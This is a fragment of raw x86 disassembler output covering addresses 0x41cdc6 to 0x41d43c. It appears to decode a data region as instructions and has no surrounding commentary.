  41cdc6:	das    
  41cdc7:	sub    al,0x2f
  41cdc9:	das    
  41cdca:	xor    BYTE PTR [ecx+0x2f],al
  41cdcd:	xor    BYTE PTR [edi],ch
  41cdcf:	sub    eax,DWORD PTR [eax]
  41cdd1:	or     bl,BYTE PTR [ecx]
  41cdd3:	and    bl,BYTE PTR [edi]
  41cdd5:	pop    ds
  41cdd6:	pop    ds
  41cdd7:	pop    ds
  41cdd8:	sub    ch,BYTE PTR [edx]
  41cdda:	inc    edx
  41cddb:	inc    ecx
  41cddc:	das    
  41cddd:	xor    BYTE PTR [ecx+0x42],al
  41cde0:	inc    edx
  41cde1:	dec    eax
  41cde2:	inc    ecx
  41cde3:	das    
  41cde4:	inc    ecx
  41cde5:	xor    BYTE PTR [eax+0x30],cl
  41cde8:	inc    edx
  41cde9:	inc    ecx
  41cdea:	inc    edx
  41cdeb:	dec    eax
  41cdec:	dec    ecx
  41cded:	dec    ecx
  41cdee:	dec    ecx
  41cdef:	dec    eax
  41cdf0:	inc    edx
  41cdf1:	xor    BYTE PTR [ecx+0x41],al
  41cdf4:	inc    ecx
  41cdf5:	xor    BYTE PTR [ecx+0x30],al
  41cdf8:	xor    BYTE PTR [edi],ch
  41cdfa:	das    
  41cdfb:	das    
  41cdfc:	xor    BYTE PTR [edi+ebp*1],ch
  41cdff:	sub    al,0x19
  41ce01:	sbb    DWORD PTR [edi],ebx
  41ce03:	and    ch,BYTE PTR [edx]
  41ce05:	sub    al,0x22
  41ce07:	and    ch,BYTE PTR [edx]
  41ce09:	sub    ch,BYTE PTR [edx]
  41ce0b:	sub    al,0x2c
  41ce0d:	sub    al,0x2c
  41ce0f:	das    
  41ce10:	das    
  41ce11:	inc    ecx
  41ce12:	inc    ecx
  41ce13:	inc    ecx
  41ce14:	inc    ecx
  41ce15:	inc    edx
  41ce16:	dec    eax
  41ce17:	dec    eax
  41ce18:	dec    eax
  41ce19:	dec    eax
  41ce1a:	dec    eax
  41ce1b:	dec    ecx
  41ce1c:	push   eax
  41ce1d:	dec    ecx
  41ce1e:	inc    ecx
  41ce1f:	inc    ecx
  41ce20:	inc    edx
  41ce21:	dec    eax
  41ce22:	inc    ecx
  41ce23:	inc    ecx
  41ce24:	xor    BYTE PTR [eax],dh
  41ce26:	xor    BYTE PTR [ecx+0x30],al
  41ce29:	das    
  41ce2a:	das    
  41ce2b:	sub    al,0x2c
  41ce2d:	sub    al,0x2c
  41ce2f:	sub    al,0x19
  41ce31:	adc    DWORD PTR [edi],ebx
  41ce33:	sbb    al,0x1c
  41ce35:	pop    ds
  41ce36:	sub    ch,BYTE PTR [edx]
  41ce38:	sub    al,0x2c
  41ce3a:	sub    al,0x2f
  41ce3c:	sub    al,0x2c
  41ce3e:	sub    al,0x2f
  41ce40:	sub    al,0x2f
  41ce42:	inc    ecx
  41ce43:	inc    ecx
  41ce44:	das    
  41ce45:	xor    BYTE PTR [edx+0x48],al
  41ce48:	dec    eax
  41ce49:	dec    eax
  41ce4a:	dec    ecx
  41ce4b:	dec    ecx
  41ce4c:	dec    ecx
  41ce4d:	dec    ecx
  41ce4e:	inc    edx
  41ce4f:	xor    BYTE PTR [edx+0x30],al
  41ce52:	inc    ecx
  41ce53:	inc    edx
  41ce54:	inc    edx
  41ce55:	das    
  41ce56:	das    
  41ce57:	das    
  41ce58:	xor    BYTE PTR [esp+ebp*1],ch
  41ce5b:	sub    al,0x2a
  41ce5d:	sub    ch,BYTE PTR [edx+ebp*1]
  41ce60:	pop    ds
  41ce61:	adc    ebx,DWORD PTR [ecx]
  41ce63:	sbb    DWORD PTR [edi],ebx
  41ce65:	sbb    al,0x1c
  41ce67:	sbb    al,0x2a
  41ce69:	sub    ch,BYTE PTR [edx]
  41ce6b:	sub    ah,BYTE PTR [edx]
  41ce6d:	sub    al,0x2f
  41ce6f:	xor    BYTE PTR [edi+ebp*1],ch
  41ce72:	xor    BYTE PTR [edi],ch
  41ce74:	das    
  41ce75:	inc    edx
  41ce76:	inc    ecx
  41ce77:	dec    eax
  41ce78:	dec    eax
  41ce79:	dec    ecx
  41ce7a:	push   eax
  41ce7b:	push   eax
  41ce7c:	dec    ecx
  41ce7d:	dec    ecx
  41ce7e:	dec    eax
  41ce7f:	inc    ecx
  41ce80:	inc    edx
  41ce81:	inc    edx
  41ce82:	xor    BYTE PTR [eax],dh
  41ce84:	xor    BYTE PTR [eax],dh
  41ce86:	xor    BYTE PTR [esp+ebp*1],ch
  41ce89:	sub    ch,BYTE PTR [edx]
  41ce8b:	sub    ch,BYTE PTR [edx+ebp*1]
  41ce8e:	and    ah,BYTE PTR [edx]
  41ce90:	pop    ds
  41ce91:	adc    ebx,DWORD PTR [edi+ebx*1]
  41ce94:	and    ah,BYTE PTR [edx]
  41ce96:	and    ch,BYTE PTR [edx]
  41ce98:	and    ch,BYTE PTR [edx]
  41ce9a:	sub    al,0x2c
  41ce9c:	sub    al,0x2a
  41ce9e:	and    ah,BYTE PTR [edx]
  41cea0:	das    
  41cea1:	xor    BYTE PTR [edi],ch
  41cea3:	das    
  41cea4:	xor    BYTE PTR [edx+0x42],al
  41cea7:	dec    eax
  41cea8:	dec    eax
  41cea9:	inc    edx
  41ceaa:	dec    ecx
  41ceab:	dec    ecx
  41ceac:	dec    ecx
  41cead:	dec    eax
  41ceae:	dec    eax
  41ceaf:	dec    eax
  41ceb0:	inc    ecx
  41ceb1:	xor    BYTE PTR [ebx+0x41],al
  41ceb4:	inc    ecx
  41ceb5:	inc    ecx
  41ceb6:	xor    BYTE PTR [edx+ebp*1],ch
  41ceb9:	sub    ch,BYTE PTR [edx+eiz*1]
  41cebc:	sub    ch,BYTE PTR [edx]
  41cebe:	and    ah,BYTE PTR [edx]
  41cec0:	sbb    DWORD PTR [ebx],edx
  41cec2:	sbb    al,0x1f
  41cec4:	pop    ds
  41cec5:	pop    ds
  41cec6:	and    ch,BYTE PTR [edx]
  41cec8:	sub    al,0x22
  41ceca:	sub    ch,BYTE PTR [edi]
  41cecc:	sub    al,0x2a
  41cece:	and    ch,BYTE PTR [eax+esi*1]
  41ced1:	xor    BYTE PTR [edi],ch
  41ced3:	xor    BYTE PTR [edx+0x42],al
  41ced6:	dec    eax
  41ced7:	inc    ecx
  41ced8:	inc    ecx
  41ced9:	xor    BYTE PTR [edx+0x41],al
  41cedc:	push   eax
  41cedd:	dec    eax
  41cede:	dec    eax
  41cedf:	inc    edx
  41cee0:	inc    ecx
  41cee1:	xor    BYTE PTR [edx+0x30],al
  41cee4:	inc    ecx
  41cee5:	xor    BYTE PTR [esp+ebp*1],ch
  41cee8:	das    
  41cee9:	sub    al,0x2c
  41ceeb:	sub    al,0x2a
  41ceed:	pop    ds
  41ceee:	and    ah,BYTE PTR [edx]
  41cef0:	sbb    al,0x13
  41cef2:	sbb    DWORD PTR [ecx],ebx
  41cef4:	sbb    al,0x1f
  41cef6:	sbb    DWORD PTR [edi],ebx
  41cef8:	and    ah,BYTE PTR [edx]
  41cefa:	sub    al,0x2f
  41cefc:	sub    ch,BYTE PTR [edi+ebp*1]
  41ceff:	xor    BYTE PTR [eax],dh
  41cf01:	xor    BYTE PTR [edi],ch
  41cf03:	inc    ecx
  41cf04:	inc    edx
  41cf05:	inc    ecx
  41cf06:	xor    BYTE PTR [ecx+0x42],al
  41cf09:	xor    BYTE PTR [edx+0x41],al
  41cf0c:	inc    edx
  41cf0d:	inc    ecx
  41cf0e:	inc    edx
  41cf0f:	inc    edx
  41cf10:	inc    edx
  41cf11:	inc    ecx
  41cf12:	das    
  41cf13:	das    
  41cf14:	das    
  41cf15:	das    
  41cf16:	das    
  41cf17:	sub    al,0x2c
  41cf19:	sub    al,0x22
  41cf1b:	and    ah,BYTE PTR [edx]
  41cf1d:	and    bl,BYTE PTR [edi]
  41cf1f:	pop    ds
  41cf20:	adc    ebx,DWORD PTR [ecx]
  41cf22:	sbb    al,0x1c
  41cf24:	sbb    al,0x22
  41cf26:	pop    ds
  41cf27:	pop    ds
  41cf28:	and    ah,BYTE PTR [edx]
  41cf2a:	sub    ch,BYTE PTR [edx]
  41cf2c:	sub    al,0x2c
  41cf2e:	das    
  41cf2f:	xor    BYTE PTR [eax],dh
  41cf31:	inc    ecx
  41cf32:	xor    BYTE PTR [eax],dh
  41cf34:	xor    BYTE PTR [eax],dh
  41cf36:	das    
  41cf37:	das    
  41cf38:	inc    ecx
  41cf39:	das    
  41cf3a:	inc    ecx
  41cf3b:	xor    BYTE PTR [ecx+0x41],al
  41cf3e:	xor    BYTE PTR [ecx+0x41],al
  41cf41:	inc    edx
  41cf42:	das    
  41cf43:	xor    BYTE PTR [edi],ch
  41cf45:	das    
  41cf46:	sub    al,0x2a
  41cf48:	sub    al,0x2c
  41cf4a:	sub    ah,BYTE PTR [edx]
  41cf4c:	sub    ah,BYTE PTR [edx]
  41cf4e:	pop    ds
  41cf4f:	sbb    al,0x19
  41cf51:	sbb    DWORD PTR [ecx],ebx
  41cf53:	sbb    al,0x1c
  41cf55:	pop    ds
  41cf56:	sbb    al,0x20
  41cf58:	and    ah,BYTE PTR [eax]
  41cf5a:	and    ch,BYTE PTR [edx]
  41cf5c:	sub    ebp,DWORD PTR [edi]
  41cf5e:	das    
  41cf5f:	xor    BYTE PTR [edi],ch
  41cf61:	xor    DWORD PTR [ecx+0x41],eax
  41cf64:	xor    BYTE PTR [ebx+0x30],al
  41cf67:	das    
  41cf68:	das    
  41cf69:	xor    BYTE PTR [ebx+0x41],al
  41cf6c:	inc    ecx
  41cf6d:	inc    ebx
  41cf6e:	inc    edx
  41cf6f:	inc    ebx
  41cf70:	inc    ecx
  41cf71:	das    
  41cf72:	inc    ecx
  41cf73:	xor    BYTE PTR [eax],dh
  41cf75:	das    
  41cf76:	xor    DWORD PTR [edx],ebp
  41cf78:	sub    bl,BYTE PTR [edi]
  41cf7a:	and    bl,BYTE PTR [edi]
  41cf7c:	and    bl,BYTE PTR [edi]
  41cf7e:	pop    ds
  41cf7f:	sbb    al,0x19
  41cf81:	adc    DWORD PTR [esp+ebx*1],ebx
  41cf84:	sbb    al,0x19
  41cf86:	pop    ds
  41cf87:	sbb    al,0x0
  41cf89:	add    BYTE PTR [ecx],al
  41cf8b:	add    BYTE PTR [ecx],al
  41cf8d:	add    BYTE PTR [ecx],al
  41cf8f:	add    BYTE PTR [ecx],al
  41cf91:	add    BYTE PTR [ecx],al
  41cf93:	add    BYTE PTR [ecx],al
  41cf95:	add    BYTE PTR [ecx],al
  41cf97:	add    BYTE PTR [edi],ch
  41cf99:	add    al,0x1
  41cf9b:	add    BYTE PTR [ecx],al
  41cf9d:	add    BYTE PTR [ecx],al
  41cf9f:	add    BYTE PTR [ecx],al
  41cfa1:	add    BYTE PTR [ecx],al
  41cfa3:	add    BYTE PTR [ecx],al
  41cfa5:	add    BYTE PTR [ecx],al
  41cfa7:	add    BYTE PTR [ecx],al
  41cfa9:	add    BYTE PTR [edi],bl
  41cfab:	pop    ds
  41cfac:	pop    ds
  41cfad:	pop    ds
  41cfae:	sbb    al,0x19
  41cfb0:	adc    edx,DWORD PTR [ebx]
  41cfb2:	pop    ds
  41cfb3:	sbb    al,0x19
  41cfb5:	sbb    DWORD PTR [ecx],ebx
  41cfb7:	sbb    al,0x1
  41cfb9:	rcl    edx,1
  41cfbb:	aam    0xd2
  41cfbd:	cmp    ecx,DWORD PTR [edx-0x2f]
  41cfc0:	rcl    dl,cl
  41cfc2:	rcl    ecx,1
  41cfc4:	rcl    dl,cl
  41cfc6:	rol    BYTE PTR [ecx],cl
  41cfc8:	xor    DWORD PTR [eax],eax
  41cfca:	add    ch,dl
  41cfcc:	aam    0xd4
  41cfce:	rcl    ebx,cl
  41cfd0:	aam    0xd4
  41cfd2:	mov    edx,edx
  41cfd4:	rcl    ch,cl
  41cfd6:	aad    0xd4
  41cfd8:	rol    DWORD PTR [eax],1
  41cfda:	add    BYTE PTR ds:0x191c1c1c,al
  41cfe0:	adc    DWORD PTR [ebx],edx
  41cfe2:	sbb    DWORD PTR [ecx],ebx
  41cfe4:	adc    ebx,DWORD PTR [ecx]
  41cfe6:	sbb    DWORD PTR [ecx],eax
  41cfe8:	ror    esp,1
  41cfea:	shr    DWORD PTR [ebp-0x34874631],0xcb
  41cff1:	enter  0xcfc8,0xce
  41cff5:	rol    BYTE PTR [eax],cl
  41cff7:	add    BYTE PTR [edi],ch
  41cff9:	xor    BYTE PTR [eax],al
  41cffb:	add    ebx,edx
  41cffd:	mov    esi,0xafaab4b1
  41d002:	mov    dl,0x8d
  41d004:	ret    
  41d005:	ret    0xbec2
  41d008:	(bad)  
  41d009:	rol    DWORD PTR [esi],cl
  41d00b:	add    al,BYTE PTR [eax]
  41d00d:	sbb    DWORD PTR [ecx+ebx*1],ebx
  41d010:	adc    DWORD PTR [ecx],edx
  41d012:	sbb    DWORD PTR [ecx],ebx
  41d014:	sbb    DWORD PTR ds:0xbdccd201,ecx
  41d01a:	les    ebp,FWORD PTR [ebp-0x4a719734]
  41d020:	ret    0xc3c3
  41d023:	ret    
  41d024:	enter  0xd3,0x2c
  41d028:	sub    al,0x2f
  41d02a:	das    
  41d02b:	add    BYTE PTR [eax],al
  41d02d:	aad    0xbe
  41d02f:	lods   al,BYTE PTR ds:[esi]
  41d030:	stos   BYTE PTR es:[edi],al
  41d031:	scas   eax,DWORD PTR es:[edi]
  41d032:	mov    cl,0xab
  41d034:	vpinsrw xmm7,xmm7,WORD PTR [esp+eax*8+0x288d1cb],0x0
  41d03e:	adc    edx,DWORD PTR [ebx]
  41d040:	adc    DWORD PTR ds:0x1131913,ecx
  41d046:	rcl    eax,1
  41d048:	leave  
  41d049:	rol    edx,0xc4
  41d04c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d04d:	adc    cl,dl
  41d04f:	mov    al,0xbb
  41d051:	mov    esi,0xbfccb4c0
  41d056:	add    BYTE PTR [edx+ebp*1],ch
  41d059:	das    
  41d05a:	das    
  41d05b:	das    
  41d05c:	add    ebx,edx
  41d05e:	(bad)  
  41d05f:	lods   al,BYTE PTR ds:[esi]
  41d060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d062:	mov    ebx,0xc4bdba8c
  41d067:	mov    esp,0xd3bdc5c5
  41d06c:	mov    ecx,0xd191401
  41d071:	or     eax,0xd3020001
  41d076:	int    0xc5
  41d078:	mov    esp,0x58ccb0cb
  41d07d:	and    eax,0xc5b3bdc9
  41d082:	enter  0xccc2,0xbf
  41d086:	add    DWORD PTR [edx],ebp
  41d088:	sub    al,0x2c
  41d08a:	sub    al,0x2f
  41d08c:	add    edi,eax
  41d08e:	(bad)  
  41d08f:	stos   BYTE PTR es:[edi],al
  41d090:	stos   DWORD PTR es:[edi],eax
  41d091:	stos   DWORD PTR es:[edi],eax
  41d092:	mov    dl,0x6c
  41d094:	imul   eax,ebp,0xffffffcb
  41d097:	(bad)  
  41d098:	(bad)  
  41d099:	les    edi,FWORD PTR [ebx+0xd3bb]
  41d09f:	adc    DWORD PTR ds:0xd4d5020d,ecx
  41d0a5:	(bad)
  41d0a9:	les    ebp,FWORD PTR [esi-0x4295a059]
  41d0af:	stos   DWORD PTR es:[edi],eax
  41d0b0:	scas   eax,DWORD PTR es:[edi]
  41d0b1:	mov    ebx,0x61cbbcbc
  41d0b6:	add    BYTE PTR [edx],ch
  41d0b8:	sub    al,0x2a
  41d0ba:	and    ch,BYTE PTR [edx]
  41d0bc:	add    DWORD PTR [esi-0x76725435],edi
  41d0c2:	test   al,0x0
  41d0c4:	add    BYTE PTR [ecx],al
  41d0c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0c7:	enter  0xbbbb,0xae
  41d0cb:	test   al,0xc8
  41d0cd:	rol    BYTE PTR [ecx],cl
  41d0cf:	adc    DWORD PTR [edx],ecx
  41d0d1:	or     al,BYTE PTR [ecx]
  41d0d3:	mov    edi,0xa8c3b3a7
  41d0d8:	test   al,0xb4
  41d0da:	ret    
  41d0db:	mov    DWORD PTR [esi],ecx
  41d0dd:	xor    eax,0xb4bf7888
  41d0e2:	mov    bl,0xbb
  41d0e4:	mov    WORD PTR [ecx+0x0],fs
  41d0e7:	and    ch,BYTE PTR [esp+ebp*1]
  41d0ea:	sub    al,0x22
  41d0ec:	add    DWORD PTR [ecx],edx
  41d0ee:	test   eax,0xaa6a87b3
  41d0f3:	add    BYTE PTR [esi+eiz*1],ah
  41d0f6:	add    DWORD PTR [edi-0x75725457],esp
  41d0fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0fd:	rol    BYTE PTR [eax],cl
  41d0ff:	add    DWORD PTR [edx],ecx
  41d101:	or     al,BYTE PTR [eax]
  41d103:	(bad)  
  41d104:	scas   eax,DWORD PTR es:[edi]
  41d105:	scas   al,BYTE PTR es:[edi]
  41d106:	stos   BYTE PTR es:[edi],al
  41d107:	mov    WORD PTR [ebp+0x1878a],fs
  41d10d:	add    DWORD PTR [eax],eax
  41d10f:	add    DWORD PTR [ebx-0x4c887a48],esp
  41d115:	popa   
  41d116:	add    DWORD PTR [edx],esp
  41d118:	and    bl,BYTE PTR [edi]
  41d11a:	and    ah,BYTE PTR [edx]
  41d11c:	add    BYTE PTR [ebp+0x73],dl
  41d11f:	mov    ds:0x28a6537,eax
  41d124:	sbb    DWORD PTR [ebx+ebx*1],ebx
  41d127:	add    BYTE PTR [ebx-0x7a877d58],dh
  41d12d:	mov    eax,0xa0d00d1
  41d132:	add    BYTE PTR [ecx-0x73443f42],ch
  41d138:	test   al,0x81
  41d13a:	add    BYTE PTR [eax],al
  41d13c:	sbb    DWORD PTR [ecx],ebx
  41d13e:	sbb    DWORD PTR [eax],eax
  41d140:	cdq    
  41d141:	xor    DWORD PTR [edi-0x5f],ebp
  41d144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d145:	popa   
  41d146:	add    BYTE PTR [ecx+ebx*1],bl
  41d149:	sbb    al,0x1c
  41d14b:	pop    ds
  41d14c:	add    BYTE PTR [ebx+esi*2+0x5d],ah
  41d150:	dec    esi
  41d151:	addr16 mov ds:0x1300,al
  41d155:	adc    ebx,DWORD PTR [ecx]
  41d157:	add    BYTE PTR [edi+esi*4-0x7f],ch
  41d15b:	data16 jg 0x41d102
  41d15e:	mov    BYTE PTR [eax],0xa
  41d161:	or     al,BYTE PTR [ecx]
  41d163:	mov    dh,BYTE PTR [esi-0x535d445c]
  41d169:	add    BYTE PTR [eax],al
  41d16b:	adc    edx,DWORD PTR [ebx]
  41d16d:	adc    edx,DWORD PTR [ebx]
  41d16f:	add    DWORD PTR [edx],eax
  41d171:	jne    0x41d1eb
  41d173:	add    BYTE PTR [edx+0x1c200061],0x1c
  41d17a:	sbb    al,0x1c
  41d17c:	add    DWORD PTR [esi+0x6a575773],edx
  41d182:	mov    eax,DWORD PTR [eax]
  41d184:	sbb    DWORD PTR [ebx],edx
  41d186:	adc    edx,DWORD PTR [ebx]
  41d188:	add    BYTE PTR [eax-0x7aa1997b],bh
  41d18e:	mov    BYTE PTR [ecx],0xa
  41d191:	add    eax,0x839f7601
  41d196:	mov    ds:0x2938c,al
  41d19b:	adc    al,0x11
  41d19d:	adc    DWORD PTR [ebx],edx
  41d19f:	add    BYTE PTR [ecx-0x5f],ah
  41d1a2:	js     0x41d21c
  41d1a4:	and    BYTE PTR [ecx+0x1c1c1901],0x19
  41d1ab:	sbb    al,BYTE PTR [ecx]
  41d1ad:	cwde   
  41d1ae:	jnp    0x41d216
  41d1b0:	add    BYTE PTR gs:[bx+si],0x13
  41d1b5:	adc    edx,DWORD PTR [ecx]
  41d1b7:	adc    DWORD PTR [ebx],eax
  41d1b9:	mov    bh,BYTE PTR [edi+0x73]
  41d1bc:	pop    si
  41d1be:	test   eax,0x50a00
  41d1c3:	pusha  
  41d1c4:	jge    0x41d240
  41d1c6:	and    DWORD PTR [eax+eax*4+0x0],0x11
  41d1cb:	add    BYTE PTR [eax],al
  41d1cd:	add    DWORD PTR [ecx],eax
  41d1cf:	add    DWORD PTR [ecx-0x5d],esi
  41d1d2:	mov    ebp,DWORD PTR [ecx-0x7e]
  41d1d5:	mov    eax,ds:0x19191901
  41d1da:	sbb    DWORD PTR [ebx],edx
  41d1dc:	add    DWORD PTR [eax],eax
  41d1de:	call   0x1401:0x76778193
  41d1e5:	adc    edx,DWORD PTR [ecx]
  41d1e7:	or     eax,0x625e4b00
  41d1ec:	popa   
  41d1ed:	dec    edi
  41d1ee:	mov    eax,DWORD PTR [ecx]
  41d1f0:	or     al,0xa
  41d1f2:	add    DWORD PTR [ebp+0x7a],ebp
  41d1f5:	outs   dx,DWORD PTR ds:[esi]
  41d1f6:	jo     0x41d259
  41d1f8:	ja     0x41d1fa
  41d1fa:	or     eax,0xa1910100
  41d1ff:	ja     0x41d193
  41d201:	mov    eax,ds:0x81786977
  41d206:	add    DWORD PTR [ecx],ebx
  41d208:	sbb    al,0x19
  41d20a:	sbb    al,0x19
  41d20c:	add    BYTE PTR [esi],cl
  41d20e:	add    BYTE PTR [eax],al
  41d210:	and    BYTE PTR [edi+0x6f],0x0
  41d214:	adc    DWORD PTR [ecx],edx
  41d216:	adc    DWORD PTR ds:0x86801a00,ecx
  41d21c:	pop    esi
  41d21d:	and    eax,0x5100084
  41d222:	add    BYTE PTR [eax+0x63688593],dl
  41d228:	jnp    0x41d22b
  41d22a:	push   cs
  41d22b:	adc    DWORD PTR [eax],eax
  41d22d:	cdq    
  41d22e:	mov    ds:0x5b74473a,al
  41d233:	push   0x19007376
  41d238:	adc    edx,DWORD PTR [ebx]
  41d23a:	adc    ebx,DWORD PTR [ecx]
  41d23c:	add    BYTE PTR [ecx+0x6f207fa0],bl
  41d242:	jl     0x41d245
  41d244:	or     eax,0xd1111
  41d249:	dec    ebx
  41d24a:	jno    0x41d2ae
  41d24c:	pop    edi
  41d24d:	dec    esi
  41d24e:	test   BYTE PTR [ecx],al
  41d250:	(bad)  
  41d252:	add    BYTE PTR [edx-0x7f],bh
  41d255:	mov    edi,DWORD PTR [eax+0x59]
  41d258:	jnp    0x41d25a
  41d25a:	push   cs
  41d25b:	or     eax,0x5e99000e
  41d260:	cmp    eax,0x533e5f38
  41d265:	pushf  
  41d266:	add    BYTE PTR [ecx],dl
  41d268:	adc    DWORD PTR [ecx],edx
  41d26a:	adc    DWORD PTR [ecx+eax*1],edx
  41d26d:	cdq    
  41d26e:	mov    eax,ds:0x99016167
  41d273:	add    BYTE PTR ds:0x110d0d,cl
  41d279:	inc    ebp
  41d27a:	push   edx
  41d27b:	cmp    al,0x5e
  41d27d:	pop    esi
  41d27e:	ja     0x41d280
  41d280:	adc    BYTE PTR [eax+eax*1],al
  41d283:	jl     0x41d2ec
  41d285:	cmp    BYTE PTR [eax+0x61],0x71
  41d289:	add    DWORD PTR [edx],ecx
  41d28b:	push   cs
  41d28c:	or     cl,BYTE PTR [edx]
  41d28e:	add    DWORD PTR [ecx-0x62626364],ebx
  41d294:	popf   
  41d295:	popf   
  41d296:	add    BYTE PTR [ecx],dl
  41d298:	adc    DWORD PTR [ecx],edx
  41d29a:	adc    DWORD PTR [ecx],edx
  41d29c:	add    BYTE PTR [edi+0x7f],ch
  41d29f:	daa    
  41d2a0:	sub    DWORD PTR [ebx],ebx
  41d2a2:	add    BYTE PTR [ecx],al
  41d2a4:	push   cs
  41d2a5:	or     cl,BYTE PTR ds:0x3715000a
  41d2ab:	es push ss
  41d2ad:	pop    ebp
  41d2ae:	jb     0x41d2b1
  41d2b0:	adc    BYTE PTR [ecx+eax*1],al
  41d2b3:	ins    DWORD PTR es:[edi],dx
  41d2b4:	jbe    0x41d237
  41d2b6:	mov    esp,DWORD PTR [ebx+0x70]
  41d2b9:	add    BYTE PTR [eax],al
  41d2bb:	add    eax,0xa0a05
  41d2c0:	add    DWORD PTR [eax],eax
  41d2c2:	add    DWORD PTR [eax],eax
  41d2c4:	add    DWORD PTR [eax],eax
  41d2c6:	add    DWORD PTR ds:0xd0d0d11,ecx
  41d2cc:	add    BYTE PTR [ebp-0x7d],ch
  41d2cf:	xor    al,0x26
  41d2d1:	cmp    BYTE PTR [eax],al
  41d2d3:	add    BYTE PTR [edx],cl
  41d2d5:	or     cl,BYTE PTR [edx]
  41d2d7:	add    eax,0x26360300
  41d2dc:	adc    eax,0xf009b60
  41d2e1:	add    al,0x0
  41d2e3:	pop    DWORD PTR [eax-0x66c59778]
  41d2e9:	add    BYTE PTR [eax],al
  41d2eb:	add    eax,0x5050505
  41d2f0:	or     cl,BYTE PTR [edx]
  41d2f2:	or     cl,BYTE PTR [edx]
  41d2f4:	or     cl,BYTE PTR [edx]
  41d2f6:	or     eax,0xd0d0a0e
  41d2fb:	or     al,BYTE PTR [ecx]
  41d2fd:	pusha  
  41d2fe:	jnp    0x41d345
  41d300:	daa    
  41d301:	daa    
  41d302:	inc    ebp
  41d303:	add    DWORD PTR [edx],ecx
  41d305:	add    eax,0x43000505
  41d30a:	sbb    eax,0x99475925
  41d30f:	add    DWORD PTR [eax],ecx
  41d311:	add    al,0x0
  41d313:	(bad)  
  41d314:	cmp    eax,0x765b635b
  41d319:	fwait
  41d31a:	add    DWORD PTR ds:0xa050504,eax
  41d320:	or     cl,BYTE PTR [edx]
  41d322:	or     cl,BYTE PTR [edx]
  41d324:	or     cl,BYTE PTR [edx]
  41d326:	or     cl,BYTE PTR [edx]
  41d328:	or     cl,BYTE PTR [edx]
  41d32a:	or     cl,BYTE PTR [ebx]
  41d32c:	add    BYTE PTR [eax+0x70],ah
  41d32f:	inc    ebx
  41d330:	xor    eax,0xb007627
  41d335:	add    eax,0x71000404
  41d33a:	xchg   edx,eax
  41d33b:	sub    DWORD PTR [ecx-0x7a],ebx
  41d33e:	sub    eax,0x10600
  41d343:	nop
  41d344:	sub    BYTE PTR [eax],ch
  41d346:	je     0x41d2cc
  41d348:	ins    DWORD PTR es:[edi],dx
  41d349:	cwde   
  41d34a:	add    BYTE PTR [edi],al
  41d34c:	add    al,0x5
  41d34e:	add    eax,0xa0a0505
  41d353:	or     al,BYTE PTR ds:0xa0a0100
  41d359:	add    eax,0x5e01050a
  41d35e:	xor    esi,DWORD PTR [esi+ecx*2]
  41d361:	add    BYTE PTR cs:[eax],0x5
  41d365:	add    al,0x4
  41d367:	add    BYTE PTR [eax],al
  41d369:	xchg   esp,eax
  41d36a:	push   esi
  41d36b:	inc    eax
  41d36c:	or     DWORD PTR [ecx],edi
  41d36e:	jg     0x41d371
  41d370:	add    DWORD PTR [ecx],eax
  41d372:	add    BYTE PTR [eax+0x3c642828],dl
  41d378:	dec    edx
  41d379:	cdq    
  41d37a:	add    DWORD PTR [eax],eax
  41d37c:	add    eax,0x5040504
  41d381:	add    eax,0x9a000105
  41d386:	add    BYTE PTR [edx],cl
  41d388:	add    eax,0x10a050a
  41d38d:	pop    ebp
  41d38e:	sub    ebx,DWORD PTR [esi]
  41d390:	cmp    eax,DWORD PTR es:[ebp+0x50701]
  41d397:	adc    al,0x14
  41d399:	or     dl,BYTE PTR [ebp+0x714e163a]
  41d39f:	add    DWORD PTR [ecx],eax
  41d3a1:	add    DWORD PTR [ecx],eax
  41d3a3:	cwde   
  41d3a4:	sub    BYTE PTR ds:0xa5d515f,bh
  41d3aa:	cwde   
  41d3ab:	add    BYTE PTR [ecx],al
  41d3ad:	add    DWORD PTR [ecx],eax
  41d3af:	add    al,0x5
  41d3b1:	pop    es
  41d3b2:	add    BYTE PTR [ecx],al
  41d3b4:	call   0x505:0x505009b
  41d3bb:	add    eax,0x377c6d00
  41d3c0:	xor    al,0x5b
  41d3c2:	xchg   ecx,eax
  41d3c3:	add    BYTE PTR [ecx],al
  41d3c5:	add    BYTE PTR [ebx+eax*4],ch
  41d3c8:	jnp    0x41d43c
  41d3ca:	cs jnp 0x41d3f5
  41d3cd:	jbe    0x41d368
  41d3cf:	add    BYTE PTR [ecx],al
  41d3d1:	add    BYTE PTR [eax],al
  41d3d3:	xchg   esi,eax
  41d3d4:	push   ebp
  41d3d5:	dec    esi
  41d3d6:	ins    DWORD PTR es:[edi],dx
  41d3d7:	pop    ebp
  41d3d8:	sub    bl,BYTE PTR [ebx+0x25d6064]
  41d3de:	add    DWORD PTR [ecx],eax
  41d3e0:	add    DWORD PTR [ecx],ebx
  41d3e2:	add    BYTE PTR [ecx+0x4019d55],bl
  41d3e8:	add    al,0x4
  41d3ea:	add    al,0x4
  41d3ec:	add    BYTE PTR [edx+0x70],bh
  41d3ef:	push   esp
  41d3f0:	ds ja  0x41d38b
  41d3f3:	or     eax,DWORD PTR [ebx+0x1f]
  41d3f6:	pop    ebp
  41d3f7:	cmp    al,0x38
  41d3f9:	push   ebp
  41d3fa:	sub    DWORD PTR [ebx],esp
  41d3fc:	popa   
  41d3fd:	cdq    
  41d3fe:	add    BYTE PTR [ecx],al
  41d400:	add    BYTE PTR [eax],al
  41d402:	add    BYTE PTR [eax],al
  41d404:	cdq    
  41d405:	jo     0x41d467
  41d407:	sub    ebx,DWORD PTR [ecx+0x7e563d5a]
  41d40d:	jne    0x41d480
  41d40f:	nop
  41d410:	xchg   ebx,eax
  41d411:	jno    0x41d487
  41d413:	jae    0x41d473
  41d415:	call   0x0:0x0
  41d41c:	add    DWORD PTR [edi+esi*1+0x10],edi
  41d420:	cmp    al,0x99
  41d422:	add    al,0x5e
  41d424:	jno    0x41d4a0
  41d426:	push   edx
  41d427:	cmp    eax,0xa3b2428
  41d42c:	call   0x0:0x1
  41d433:	add    BYTE PTR [ecx],al
  41d435:	cdq    
  41d436:	sub    DWORD PTR [eax+0x4d3d5625],edx
  41d43c:	outs   dx,BYTE PTR ds:[esi]
